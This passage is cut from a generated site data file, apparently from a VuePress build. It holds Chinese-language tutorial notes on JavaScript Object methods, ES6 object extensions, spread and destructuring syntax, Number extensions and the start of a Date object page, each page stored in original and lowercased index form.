\"h\", 1: \"e\", 2: \"l\", 3: \"l\", 4: \"o\"}\n\n\n对象的扩展运算符等同于使用Object.assign()方法。\n\nlet aClone = { ...a };\n// 等同于\nlet aClone = Object.assign({}, a);\n\n\n上面的例子只是拷贝了对象实例的属性，如果想完整克隆一个对象，还拷贝对象原型的属性，可以采用下面的写法。\n\n// 写法一\nconst clone1 = {\n  __proto__: Object.getPrototypeOf(obj),\n  ...obj\n};\n\n// 写法二\nconst clone2 = Object.assign(\n  Object.create(Object.getPrototypeOf(obj)),\n  obj\n);\n\n// 写法三\nconst clone3 = Object.create(\n  Object.getPrototypeOf(obj),\n  Object.getOwnPropertyDescriptors(obj)\n)\n\n\n扩展运算符可以用于合并两个对象。\n\nlet ab = { ...a, ...b };\n// 等同于\nlet ab = Object.assign({}, a, b);\n\n\n如果用户自定义的属性，放在扩展运算符后面，则扩展运算符内部的同名属性会被覆盖掉。\n\nlet aWithOverrides = { ...a, x: 1, y: 2 };\n// 等同于\nlet aWithOverrides = { ...a, ...{ x: 1, y: 2 } };\n// 等同于\nlet x = 1, y = 2, aWithOverrides = { ...a, x, y };\n// 等同于\nlet aWithOverrides = Object.assign({}, a, { x: 1, y: 2 });\n\n\n与数组的扩展运算符一样，对象的扩展运算符后面可以跟表达式。\n\nconst obj = {\n  ...(x > 1 ? {a: 1} : {}),\n  b: 2,\n};\n",normalizedContent:"# javascript 对象的分类\n\n 1. 内置对象：ecmascript内置的对象，直接拿来用就可以，不需要实例化\n    * 内置顶层对象(global): math;\n 2. 本地对象:需要实例化才能用\n    * string;\n    * boolean;\n    * number;\n    * function;\n    * array;\n 3. 宿主对象: bom dom\n    \n    > 宿主：js的执行环境\n\n\n# object的属性\n\n 1. constructor：是对构造函数的引用。\n 2. prototype：是对函数对象的原型引用\n    * 是函数对象的默认属性。\n    * 可以将对象的共有属性存放到原型上，也可以实现继承。\n\n\n# object的方法\n\n\n# object.assign(obj1,obj2,obj3,......)\n\n> 可用于对象的拼接，将obj2，obj3......拼接到对象obj1上，并将obj1返回，obj1改变，其他对象不变。\n\nvar obj1={name:'张三'};\nvar obj2={age:18};\nvar obj3={say:function(){\n  console.log('说话');\n}}\nconsole.log(object.assign(obj1,obj2,obj3));    //{name: \"张三\", age: 18, say: ƒ}\nconsole.log(obj1,obj2);                   // {name: \"张三\", age: 18, say: ƒ}   {age: 18}\n\n\n * 特殊用法： 对象拷贝：\n\n// 将对象obj拷贝到newobj\nvar obj = {name: '张三', age: 20};\n\nvar newobj = object.assign({},obj);\n\n\nwarning\n\n（1）浅拷贝 object.assign()方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。 （2）同名属性的替换 对于这种嵌套的对象，一旦遇到同名属性，object.assign()的处理方法是替换，而不是添加。\n\nconst target = { a: { b: 'c', d: 'e' } }\nconst source = { a: { b: 'hello' } }\nobject.assign(target, source)\n// { a: { b: 'hello' } }\n\n\n\n# object.is(a,b);\n\n> 用于判断两个值是否相同,与===类似，但又不完全一样\n\nobject.is(+0,-0);               //false\nobject.is(nan,nan);               //true\n\n\nobject.defineproperty(object, 'is', {\n  value: function(x, y) {\n    if (x === y) {\n      // 针对+0 不等于 -0的情况\n      return x !== 0 || 1 / x === 1 / y;\n    }\n    // 针对nan的情况\n    return x !== x && y !== y;\n  },\n  configurable: true,\n  enumerable: false,\n  writable: true\n});\n\n\n\n# obj.prototype.isprototypeof(b);\n\n> 确定一个对象是否存在于另一个对象的原型链中\n\nfunction a(){\n}\nvar b = new a();\nconsole.log(a.prototype.isprototypeof(b));      //true\n\n\n\n# object.defineproperty()\n\n> 直接在一个对象上定义一个新属性，或者修改一个对象的现有属性， 并返回这个对象。如果不指定configurable, writable, enumerable ，则这些属性默认值为false，如果不指定value, get, set，则这些属性默认值为undefined\n\n语法: object.defineproperty(obj, prop, descriptor)\n\nvar obj = new object();\nobject.defineproperty(obj, 'name', {\n    configurable: false,\n    writable: true,\n    enumerable: true,           //该属性是否可枚举\n    value: '张三'\n})\nconsole.log(obj.name)  //张三\n\n\n\n# object.defineproperties()\n\n> 直接在一个对象上定义一个或多个新的属性或修改现有属性，并返回该对象。\n\n语法: object.defineproperties(obj, props)\nprops数据描述：\n\n * value: 属性对应的值,可以使任意类型的值，默认为 undefined\n * configurable: 是否可以删除目标属性或是否可以再次修改属性的特性（writable, configurable, enumerable）。设置为true可以被删除或可以重新设置特性；设置为false，不能被可以被删除或不可以重新设置特性。默认为false。\n * writable: 属性的值是否可以被重写。设置为true可以被重写。默认为false。\n * enumerable: 属性是否可以被枚举(使用for...in或object.keys())。设置为true可以被枚举。默认为false。\n\nvar obj = new object();\nobject.defineproperties(obj, {\n    name: {\n        value: '张三',\n        configurable: false,\n        writable: true,\n        enumerable: true\n    },\n    age: {\n        value: 18,\n        configurable: true\n    }\n})\nconsole.log(obj.name, obj.age) // 张三, 18\n\n\n\n# object.freeze(obj)\n\n> 阻止修改现有属性的特性和值，并阻止添加新属性。\n\nvar obj={name:'张三',age:18};\nobject.freeze(obj)\nobj.name='李四';\nobj.sex='男';\nconsole.log(obj)                //{name: \"张三\", age: 18}\n\n\n用途：用const声明的对象属性方法任然可修改，可以利用这个方法将对象彻底冻结，使其符合const变量的含义\n\nvar obj = {\n    name:\"zhangsan\",\n    age: 20\nobject.freeze(obj)\nobj.name = \"lisi\"\nconsole.log(obj.name)     // \"zhangsan\"\n\n\n\n# __proto__属性，object.setprototypeof()，object.getprototypeof()\n\n> javascript 语言的对象继承是通过原型链实现的。es6 提供了更多原型对象的操作方法\n\n# __proto__属性（前后各两个下划线），用来读取或设置当前对象的原型对象（prototype）。目前，所有浏览器（包括 ie11）都部署了这个属性\n\n// es5 的写法\nconst obj = {\n  method: function() { ... }\n};\nobj.__proto__ = someotherobj; //不建议\n\n// es6 的写法\nvar obj = object.create(someotherobj);\nobj.method = function() { ... };\n\n\n实现上，__proto__调用的是object.prototype.__proto__\n\nobject.defineproperty(object.prototype, '__proto__', {\n  get() {\n    let _thisobj = object(this);\n    return object.getprototypeof(_thisobj);\n  },\n  set(proto) {\n    if (this === undefined || this === null) {\n      throw new typeerror();\n    }\n    if (!isobject(this)) {\n      return undefined;\n    }\n    if (!isobject(proto)) {\n      return undefined;\n    }\n    let status = reflect.setprototypeof(this, proto);\n    if (!status) {\n      throw new typeerror();\n    }\n  },\n});\n\nfunction isobject(value) {\n  return object(value) === value;\n}\n\n\n\ntip\n\n如果一个对象本身部署了__proto__属性，该属性的值就是对象的原型。\n\n# object.setprototypeof\n\n> object.setprototypeof方法的作用与__proto__相同，用来设置一个对象的原型对象（prototype），返回参数对象本身。它是 es6 正式推荐的设置原型对象的方法。\n\n// 格式\nobject.setprototypeof(object, prototype)\n\n// 用法\nconst o = object.setprototypeof({}, null);\n\n// 等于\n\nfunction setprototypeof(obj, proto) {\n  obj.__proto__ = proto;\n  return obj;\n}\n\n\n如果第一个参数不是对象，会自动转为对象。但是由于返回的还是第一个参数，所以这个操作不会产生任何效果\n\nobject.setprototypeof(1, {}) === 1 // true\nobject.setprototypeof('foo', {}) === 'foo' // true\nobject.setprototypeof(true, {}) === true // true\n// 由于undefined和null无法转为对象，所以如果第一个参数是undefined或null，就会报错。\nobject.setprototypeof(undefined, {})\n// typeerror: object.setprototypeof called on null or undefined\nobject.setprototypeof(null, {})\n// typeerror: object.setprototypeof called on null or undefined\n\n\n# object.getprototypeof()\n\n> 该方法与object.setprototypeof方法配套，用于读取一个对象的原型对象。\n\nfunction rectangle() {\n  // ...\n}\n\nconst rec = new rectangle();\n\nobject.getprototypeof(rec) === rectangle.prototype\n// true\n\nobject.setprototypeof(rec, object.prototype);\nobject.getprototypeof(rec) === rectangle.prototype\n// false\n\n\n\n如果参数不是对象，会被自动转为对象。\n\n// 等同于 object.getprototypeof(number(1))\nobject.getprototypeof(1)\n// number {[[primitivevalue]]: 0}\n\n// 等同于 object.getprototypeof(string('foo'))\nobject.getprototypeof('foo')\n// string {length: 0, [[primitivevalue]]: \"\"}\n\n// 等同于 object.getprototypeof(boolean(true))\nobject.getprototypeof(true)\n// boolean {[[primitivevalue]]: false}\n\nobject.getprototypeof(1) === number.prototype // true\nobject.getprototypeof('foo') === string.prototype // true\nobject.getprototypeof(true) === boolean.prototype // true\n\n// 如果参数是undefined或null，它们无法转为对象，所以会报错。\nobject.getprototypeof(null)\n// typeerror: cannot convert undefined or null to object\n\nobject.getprototypeof(undefined)\n// typeerror: cannot convert undefined or null to object\n\n\n\n# object.getownpropertydescriptor()\n\n> 方法返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）\n\nconst object1 = {\n  property1: 42\n};\nconst descriptor1 = object.getownpropertydescriptor(object1, 'property1');\n\nconsole.log(descriptor1.configurable);\n// expected output: true\n\nconsole.log(descriptor1.value);\n// expected output: 42\n\n\n\n# object.getownpropertydescriptors()\n\n> 方法用来获取一个对象的所有自身属性的描述符。\n\n * 参数 obj 任意对象\n * 返回值 所指定对象的所有自身属性的描述符，如果没有任何自身属性，则返回空对象。\n\n\n# es6对象的遍历\n\n\n# 1. for in 循环\n\n> 循环遍历对象自身的和继承的可枚举属性(不含symbol属性).\n\nvar obj={\n  name:'小米',\n  age:18,\n  say:function(){\n    console.log('你好');\n  }\n}\nfor (var i in obj) {\n  console.log(obj[i]);\n}\n\n\n\n# 2. object.keys(obj)\n\n> 返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 symbol 属性）的键名。\n\nvar obj = {'a':'123','b':'345'};\nconsole.log(object.keys(obj));  //['a','b']\n\n// 如果键名是数字，则按从小到大排列\nvar obj1 = { 100: \"a\", 2: \"b\", 7: \"c\"};\nconsole.log(object.keys(obj1)); // console: [\"2\", \"7\", \"100\"]\n\nvar obj2 = object.create({}, { getfoo : { value : function () { return this.foo } } });\nobj2.foo = 1;\nconsole.log(object.keys(obj2)); // [\"foo\"]\n\n\n> 由于 for...in会遍历出继承的属性，使问题复杂化，大多数时候，我们只关心对象自身的属性。所以，尽量不要用for...in循环，而用object.keys()代替。\n\n\n# 3. object.getownpropertynames(obj);\n\n> 返回一个数组,包含对象自身的所有属性(不含symbol属性,但是包括不可枚举属性).\n\n\n# 4. object.getownpropertysymbols(obj);\n\n> 返回一个数组，包含对象自身的所有symbol属性。\n\n\n# 5. reflect.ownkeys(obj);\n\n> 返回一个数组,包含对象自身的所有属性,不管属性名是symbol或字符串,也不管是否可枚举.\n\n\n# 6. object.values(obj)\n\n> 方法返回一个给定对象自身的所有可枚举属性值的数组，值的顺序与使用for...in循环的顺序相同( 区别在于 for-in 循环枚举原型链中的属性 )。过滤属性名为 symbol 值的属性\n\nvar obj = { name: 'zhangsan', age: 20 };\nconsole.log(object.values(obj)); // ['zhangsan', 20]\n\n\n如果参数不是对象，object.values会先将其转为对象。由于数值和布尔值的包装对象，都不会为实例添加非继承的属性。所以，object.values会返回空数组。\n\nobject.values(42) // []\nobject.values(true) // []\n\n\n\n# 7 object.create();\n\n> 方法创建一个新对象，使用现有的对象来提供新创建的对象的__proto__。\n\nconst person = {\n  ishuman: false,\n  printintroduction: function() {\n    console.log(`my name is ${this.name}. am i human? ${this.ishuman}`);\n  }\n};\nconst me = object.create(person);\nme.name = 'matthew'; // \"name\" is a property set on \"me\", but not on \"person\"\nme.ishuman = true; // inherited properties can be overwritten\nme.printintroduction();\n// expected output: \"my name is matthew. am i human? true\"\n\n\n\n# 8 object.entries()\n\n> 方法返回一个给定对象自身可枚举属性的键值对数组，其排列与使用 for...in 循环遍历该对象时返回的顺序一致（区别在于 for-in 循环还会枚举原型链中的属性）。过滤属性名为 symbol 值的属性\n\nconst object1 = {\n  a: 'somestring',\n  b: 42\n};\n\nfor (const [key, value] of object.entries(object1)) {\n  console.log(`${key}: ${value}`);\n}\n// expected output:\n// \"a: somestring\"\n// \"b: 42\"\n// order is not guaranteed\n\n\nobject.entries方法的另一个用处是，将对象转为真正的map结构。\n\nconst obj = { foo: 'bar', baz: 42 };\nconst map = new map(object.entries(obj));\nmap // map { foo: \"bar\", baz: 42 }\n\n\n\n# 9 object.fromentries()\n\n> 方法把键值对列表转换为一个对象\n\nconst entries = new map([\n  ['foo', 'bar'],\n  ['baz', 42]\n]);\nconst obj = object.fromentries(entries);\nconsole.log(obj);\n// expected output: object { foo: \"bar\", baz: 42 }\n\n\n\n# 对象的扩展\n\n\n# 属性的简洁表示法\n\n> es6 允许在大括号里面，直接写入变量和函数，作为对象的属性和方法。这样的书写更加简洁。\n\nconst foo = 'bar';\nconst baz = {foo};\nbaz // {foo: \"bar\"}\n\n// 等同于\nconst baz = {foo: foo};\n\n\nfunction f(x, y) {\n  return {x, y};\n}\n\n// 等同于\n\nfunction f(x, y) {\n  return {x: x, y: y};\n}\n\nf(1, 2) // object {x: 1, y: 2}\n\n\n\n# 方法的简写\n\nwarning\n\n注意，简写的对象方法不能用作构造函数，会报错。\n\nconst o = {\n  method() {\n    return \"hello!\";\n  }\n};\n\n// 等同于\n\nconst o = {\n  method: function() {\n    return \"hello!\";\n  }\n};\n\nlet birth = '2000/01/01';\n\nconst person = {\n\n  name: '张三',\n\n  //等同于birth: birth\n  birth,\n\n  // 等同于hello: function ()...\n  hello() { console.log('我的名字是', this.name); }\n\n};\n\n\n\n# 属性名表达式\n\n> javascript 定义对象的属性，有两种方法。\n\nconst obj = {};\n// 方法一\nobj.foo = true;\n\n// 方法二\nobj['a' + 'bc'] = 123;\n\n\nlet propkey = 'foo';\n\nlet obj = {\n[propkey]: true,\n['a' + 'bc']: 123\n};\n\nlet lastword = 'last word';\n\nconst a = {\n'first word': 'hello',\n[lastword]: 'world'\n};\n\na['first word'] // \"hello\"\na[lastword] // \"world\"\na['last word'] // \"world\"\n\n\n\n> 表达式还可以用于定义方法名。\n\nlet obj = {\n  ['h' + 'ello']() {\n    return 'hi';\n  }\n};\n\nobj.hello() // hi\n\n\nwarning\n\n注意，属性名表达式与简洁表示法，不能同时使用，会报错。\n\n// 报错\nconst foo = 'bar';\nconst bar = 'abc';\nconst baz = { [foo] };\n\n// 正确\nconst foo = 'bar';\nconst baz = { [foo]: 'abc'};\n\n\nwarning\n\n属性名表达式如果是一个对象，默认情况下会自动将对象转为字符串[object object]，这一点要特别小心。\n\nconst keya = {a: 1};\nconst keyb = {b: 2};\n\nconst myobject = {\n  [keya]: 'valuea',\n  [keyb]: 'valueb'\n};\n\nmyobject // object {[object object]: \"valueb\"}\n\n// 上面代码中，[keya]和[keyb]得到的都是[object object]，所以[keyb]会把[keya]覆盖掉，而myobject最后只有一个[object object]属性。\n\n\n\n# 方法的 name 属性\n\n> 函数的name属性，返回函数名。对象方法也是函数，因此也有name属性。\n\nconst person = {\n  sayname() {\n    console.log('hello!');\n  },\n};\n\nperson.sayname.name   // \"sayname\"\n\n\n> 如果对象的方法使用了取值函数（getter）和存值函数（setter），则name属性不是在该方法上面，而是该方法的属性的描述对象的get和set属性上面，返回值是方法名前加上get和set。\n\nconst obj = {\n  get foo() {},\n  set foo(x) {}\n};\n\nobj.foo.name\n// typeerror: cannot read property 'name' of undefined\n\nconst descriptor = object.getownpropertydescriptor(obj, 'foo');\n\ndescriptor.get.name // \"get foo\"\ndescriptor.set.name // \"set foo\"\n\n\nwarning\n\n有两种特殊情况：bind方法创造的函数，name属性返回bound加上原函数的名字；function构造函数创造的函数，name属性返回anonymous。\n\n(new function()).name // \"anonymous\"\n\nvar dosomething = function() {\n  // ...\n};\ndosomething.bind().name // \"bound dosomething\"\n\n\n> 如果对象的方法是一个 symbol 值，那么name属性返回的是这个 symbol 值的描述。\n\nconst key1 = symbol('description');\nconst key2 = symbol();\nlet obj = {\n  [key1]() {},\n  [key2]() {},\n};\nobj[key1].name // \"[description]\"\nobj[key2].name // \"\"\n\n\n\n# 属性的可枚举性和遍历\n\nes6 一共有 5 种方法可以遍历对象的属性。\n\n（1）for...in\n\nfor...in循环遍历对象自身的和继承的可枚举属性（不含 symbol 属性）。\n\n（2）object.keys(obj)\n\nobject.keys返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 symbol 属性）的键名。\n\n（3）object.getownpropertynames(obj)\n\nobject.getownpropertynames返回一个数组，包含对象自身的所有属性（不含 symbol 属性，但是包括不可枚举属性）的键名。\n\n（4）object.getownpropertysymbols(obj)\n\nobject.getownpropertysymbols返回一个数组，包含对象自身的所有 symbol 属性的键名。\n\n（5）reflect.ownkeys(obj)\n\nreflect.ownkeys返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 symbol 或字符串，也不管是否可枚举。\n\n以上的 5 种方法遍历对象的键名，都遵守同样的属性遍历的次序规则。\n\n首先遍历所有数值键，按照数值升序排列。 其次遍历所有字符串键，按照加入时间升序排列。 最后遍历所有 symbol 键，按照加入时间升序排列。\n\nreflect.ownkeys({ [symbol()]:0, b:0, 10:0, 2:0, a:0 })\n// ['2', '10', 'b', 'a', symbol()]\n\n\n上面代码中，reflect.ownkeys方法返回一个数组，包含了参数对象的所有属性。这个数组的属性次序是这样的，首先是数值属性2和10，其次是字符串属性b和a，最后是 symbol 属性。\n\n\n# super 关键字\n\n> this关键字总是指向函数所在的当前对象，es6 又新增了另一个类似的关键字super，指向当前对象的原型对象。\n\nconst proto = {\n  foo: 'hello'\n};\n\nconst obj = {\n  foo: 'world',\n  find() {\n    return super.foo;\n  }\n};\n\nobject.setprototypeof(obj, proto);\nobj.find() // \"hello\"\n\n\nwarning\n\n注意，super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错\n\n// 报错\nconst obj = {\n  foo: super.foo\n}\n\n// 报错\nconst obj = {\n  foo: () => super.foo\n}\n\n// 报错\nconst obj = {\n  foo: function () {\n    return super.foo\n  }\n}\n\n\n> 上面三种super的用法都会报错，因为对于 javascript 引擎来说，这里的super都没有用在对象的方法之中。第一种写法是super用在属性里面，第二种和第三种写法是super用在一个函数里面，然后赋值给foo属性。目前，只有对象方法的简写法可以让 javascript 引擎确认，定义的是对象的方法\n\ntip\n\njavascript 引擎内部，super.foo等同于object.getprototypeof(this).foo（属性）或object.getprototypeof(this).foo.call(this)（方法）。\n\nconst proto = {\n  x: 'hello',\n  foo() {\n    console.log(this.x);\n  },\n};\n\nconst obj = {\n  x: 'world',\n  foo() {\n    super.foo();\n  }\n}\n\nobject.setprototypeof(obj, proto);\n\nobj.foo() // \"world\"\n\n\n> 上面代码中，super.foo指向原型对象proto的foo方法，但是绑定的this却还是当前对象obj，因此输出的就是world。\n\n\n# 对象的扩展运算符\n\n> 与数组的结构扩展运算符类似\n\n\n# 解构赋值\n\n> 对象的解构赋值用于从一个对象取值，相当于将目标对象自身的所有可遍历的（enumerable）、但尚未被读取的属性，分配到指定的对象上面。所有的键和它们的值，都会拷贝到新对象上面。\n\nlet { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nx // 1\ny // 2\nz // { a: 3, b: 4 }\n\n// 变量z是解构赋值所在的对象。它获取等号右边的所有尚未读取的键（a和b），将它们连同值一起拷贝过来。\n\n\n> 由于解构赋值要求等号右边是一个对象，所以如果等号右边是undefined或null，就会报错，因为它们无法转为对象。\n\nlet { ...z } = null; // 运行时错误\nlet { ...z } = undefined; // 运行时错误\n\n\n> 解构赋值必须是最后一个参数，否则会报错。\n\nlet { ...x, y, z } = someobject; // 句法错误\nlet { x, ...y, ...z } = someobject; // 句法错误\n\n\nwarning\n\n注意，解构赋值的拷贝是浅拷贝，即如果一个键的值是复合类型的值（数组、对象、函数）、那么解构赋值拷贝的是这个值的引用，而不是这个值的副本。\n\nlet obj = { a: { b: 1 } };\nlet { ...x } = obj;\nobj.a.b = 2;\nx.a.b // 2\n// 上面代码中，对象o3复制了o2，但是只复制了o2自身的属性，没有复制它的原型对象o1的属性。\n\n\nconst o = object.create({ x: 1, y: 2 });\no.z = 3;\n\nlet { x, ...newobj } = o;\nlet { y, z } = newobj;\nx // 1\ny // undefined\nz // 3\n\n// 变量x是单纯的解构赋值，所以可以读取对象o继承的属性；变量y和z是扩展运算符的解构赋值，只能读取对象o自身的属性，所以变量z可以赋值成功，变量y取不到值。es6 规定，变量声明语句之中，如果使用解构赋值，扩展运算符后面必须是一个变量名，而不能是一个解构赋值表达式，所以上面代码引入了中间变量newobj，如果写成下面这样会报错。\n\n\nlet { x, ...{ y, z } } = o;\n// syntaxerror: ... must be followed by an identifier in declaration contexts\n\n\n> 解构赋值的一个用处，是扩展某个函数的参数，引入其他操作。\n\nfunction basefunction({ a, b }) {\n  // ...\n}\nfunction wrapperfunction({ x, y, ...restconfig }) {\n  // 使用 x 和 y 参数进行操作\n  // 其余参数传给原始函数\n  return basefunction(restconfig);\n}\n\n\n\n# 扩展运算符\n\n对象的扩展运算符（...）用于取出参数对象的所有可遍历属性，拷贝到当前对象之中。\n\nlet z = { a: 3, b: 4 };\nlet n = { ...z };\nn // { a: 3, b: 4 }\n\n\n由于数组是特殊的对象，所以对象的扩展运算符也可以用于数组。\n\nlet foo = { ...['a', 'b', 'c'] };\nfoo\n// {0: \"a\", 1: \"b\", 2: \"c\"}\n\n\n如果扩展运算符后面是一个空对象，则没有任何效果。\n\n{...{}, a: 1}\n// { a: 1 }\n\n\n如果扩展运算符后面不是对象，则会自动将其转为对象。\n\n// 由于该对象没有自身属性，所以返回一个空对象。\n// 等同于 {...object(1)}\n{...1} // {}\n\n// 等同于 {...object(true)}\n{...true} // {}\n\n// 等同于 {...object(undefined)}\n{...undefined} // {}\n\n// 等同于 {...object(null)}\n{...null} // {}\n\n\n但是，如果扩展运算符后面是字符串，它会自动转成一个类似数组的对象，因此返回的不是空对象。\n\n{...'hello'}\n// {0: \"h\", 1: \"e\", 2: \"l\", 3: \"l\", 4: \"o\"}\n\n\n对象的扩展运算符等同于使用object.assign()方法。\n\nlet aclone = { ...a };\n// 等同于\nlet aclone = object.assign({}, a);\n\n\n上面的例子只是拷贝了对象实例的属性，如果想完整克隆一个对象，还拷贝对象原型的属性，可以采用下面的写法。\n\n// 写法一\nconst clone1 = {\n  __proto__: object.getprototypeof(obj),\n  ...obj\n};\n\n// 写法二\nconst clone2 = object.assign(\n  object.create(object.getprototypeof(obj)),\n  obj\n);\n\n// 写法三\nconst clone3 = object.create(\n  object.getprototypeof(obj),\n  object.getownpropertydescriptors(obj)\n)\n\n\n扩展运算符可以用于合并两个对象。\n\nlet ab = { ...a, ...b };\n// 等同于\nlet ab = object.assign({}, a, b);\n\n\n如果用户自定义的属性，放在扩展运算符后面，则扩展运算符内部的同名属性会被覆盖掉。\n\nlet awithoverrides = { ...a, x: 1, y: 2 };\n// 等同于\nlet awithoverrides = { ...a, ...{ x: 1, y: 2 } };\n// 等同于\nlet x = 1, y = 2, awithoverrides = { ...a, x, y };\n// 等同于\nlet awithoverrides = object.assign({}, a, { x: 1, y: 2 });\n\n\n与数组的扩展运算符一样，对象的扩展运算符后面可以跟表达式。\n\nconst obj = {\n  ...(x > 1 ? {a: 1} : {}),\n  b: 2,\n};\n",charsets:{cjk:!0}},{title:"Number扩展",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/11-Number%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/11-Number对象.md",key:"v-3efb0494",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/11-Number%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"Number.isFinite() 与 Number.isNaN()",slug:"number-isfinite-与-number-isnan",normalizedTitle:"number.isfinite() 与 number.isnan()",charIndex:15},{level:2,title:"Number.isInteger()  用来判断一个值是否为整数。",slug:"number-isinteger-用来判断一个值是否为整数。",normalizedTitle:"number.isinteger()  用来判断一个值是否为整数。",charIndex:null},{level:2,title:"Number.parseInt(), Number.parseFloat()",slug:"number-parseint-number-parsefloat",normalizedTitle:"number.parseint(), number.parsefloat()",charIndex:456},{level:2,title:"Number.isSafeInteger()",slug:"number-issafeinteger",normalizedTitle:"number.issafeinteger()",charIndex:930}],headersStr:"Number.isFinite() 与 Number.isNaN() Number.isInteger()  用来判断一个值是否为整数。 Number.parseInt(), Number.parseFloat() Number.isSafeInteger()",content:"# Number扩展\n\n\n# Number.isFinite() 与 Number.isNaN()\n\n> Number.isFinite()用来检查一个值是否为有限的。\n\nNumber.isNaN()用来检查一个值是否是NaN。\n\nconsole.log(isFinite('15')); // true\nconsole.log(isFinite(true)); // true\nconsole.log(Number.isFinite('15')); // false\nconsole.log(Number.isFinite(true)); // false\n\nconsole.log(isNaN('true')) // true\nconsole.log(Number.isNaN('true')) // false\n\n\n\n# Number.isInteger() 用来判断一个值是否为整数。\n\n> 需要注意的是，在JavaScript内部，整数和浮点数是同样的储存方法，所以3和3.0被视为同一个值。\n\n\n# Number.parseInt(), Number.parseFloat()\n\n> ES6 将全局方法parseInt()和parseFloat()，移植到Number对象上面，行为完全保持不变\n\n// ES5的写法\nparseInt('12.34') // 12\nparseFloat('123.45#') // 123.45\n\n// ES6的写法\nNumber.parseInt('12.34') // 12\nNumber.parseFloat('123.45#') // 123.45\n\n\nconsole.log(Number.isInteger(25)) // true\nconsole.log(Number.isInteger(25.0)) // true\nconsole.log(Number.isInteger(25.1)) // false\nconsole.log(Number.isInteger(\"15\")) // false\nconsole.log(Number.isInteger(true)) // false\n\n\n\n# Number.isSafeInteger()\n\n> JavaScript 能够准确表示的整数范围在-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示这个值。\n\nMath.pow(2, 53) // 9007199254740992\n\n9007199254740992 // 9007199254740992\n9007199254740993 // 9007199254740992\n\nMath.pow(2, 53) === Math.pow(2, 53) + 1\n// true\n\n\n> ES6 引入了Number. MAX_SAFE_INTEGER和Number. MIN_SAFE_INTEGER这两个常量，用来表示这个范围的上下限。",normalizedContent:"# number扩展\n\n\n# number.isfinite() 与 number.isnan()\n\n> number.isfinite()用来检查一个值是否为有限的。\n\nnumber.isnan()用来检查一个值是否是nan。\n\nconsole.log(isfinite('15')); // true\nconsole.log(isfinite(true)); // true\nconsole.log(number.isfinite('15')); // false\nconsole.log(number.isfinite(true)); // false\n\nconsole.log(isnan('true')) // true\nconsole.log(number.isnan('true')) // false\n\n\n\n# number.isinteger() 用来判断一个值是否为整数。\n\n> 需要注意的是，在javascript内部，整数和浮点数是同样的储存方法，所以3和3.0被视为同一个值。\n\n\n# number.parseint(), number.parsefloat()\n\n> es6 将全局方法parseint()和parsefloat()，移植到number对象上面，行为完全保持不变\n\n// es5的写法\nparseint('12.34') // 12\nparsefloat('123.45#') // 123.45\n\n// es6的写法\nnumber.parseint('12.34') // 12\nnumber.parsefloat('123.45#') // 123.45\n\n\nconsole.log(number.isinteger(25)) // true\nconsole.log(number.isinteger(25.0)) // true\nconsole.log(number.isinteger(25.1)) // false\nconsole.log(number.isinteger(\"15\")) // false\nconsole.log(number.isinteger(true)) // false\n\n\n\n# number.issafeinteger()\n\n> javascript 能够准确表示的整数范围在-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示这个值。\n\nmath.pow(2, 53) // 9007199254740992\n\n9007199254740992 // 9007199254740992\n9007199254740993 // 9007199254740992\n\nmath.pow(2, 53) === math.pow(2, 53) + 1\n// true\n\n\n> es6 引入了number. max_safe_integer和number. min_safe_integer这两个常量，用来表示这个范围的上下限。",charsets:{cjk:!0}},{title:"Date对象",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/09-Date%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/09-Date对象.md",key:"v-665613b6",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/09-Date%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"创建日期对象",slug:"创建日期对象",normalizedTitle:"创建日期对象",charIndex:66},{level:2,title:"Date上的方法",slug:"date上的方法",normalizedTitle:"date上的方法",charIndex:755},{level:3,title:"获取日期信息的方法",slug:"获取日期信息的方法",normalizedTitle:"获取日期信息的方法",charIndex:888},{level:3,title:"设置日期的方法",slug:"设置日期的方法",normalizedTitle:"设置日期的方法",charIndex:1389},{level:2,title:"获取时间戳的方法",slug:"获取时间戳的方法",normalizedTitle:"获取时间戳的方法",charIndex:2157},{level:2,title:"课堂实例",slug:"课堂实例",normalizedTitle:"课堂实例",charIndex:2552}],headersStr:"创建日期对象 Date上的方法 获取日期信息的方法 设置日期的方法 获取时间戳的方法 课堂实例",content:"# Date对象\n\n> Date对象是用来处理日期和时间，Date 对象基于1970年1月1日（世界标准时间）起的毫秒数。\n\n\n# 创建日期对象\n\n通过实例化Date来创建日期对象，传入参数的形式有以下几种\n\nnew Date()   \nnew Date(1543299465541);    //参数为时间戳返回时间戳对应的时间对象   (时间戳是从1970年1月1日开始的毫秒数 )\nnew Date('December 17, 1996 03:24:00');   //传入日期的字符串形式\nnew Date('1995-12-17T03:24:00');      \nnew Date(1996, 02, 07);           //传入年月日，不用加引号\nnew Date(1996, 02, 07, 3, 24, 0);   //  穿入年，月，日，时，分，秒\n\n\nnew Date();           //  不传参数返回当前时间对象 Tue Nov 27 2018 14:12:40 GMT+0800 (中国标准时间)\nnew Date(value);      //参数为时间戳返回时间戳对应的时间对象   (时间戳是从1970年1月1日开始的毫秒数 )\nnew Date(dateString);    //表示日期的字符串值。该字符串应该能被 Date.parse() 方法识别\nnew Date(year, month[, day[, hour[, minutes[, seconds[, milliseconds]]]]]);\n// 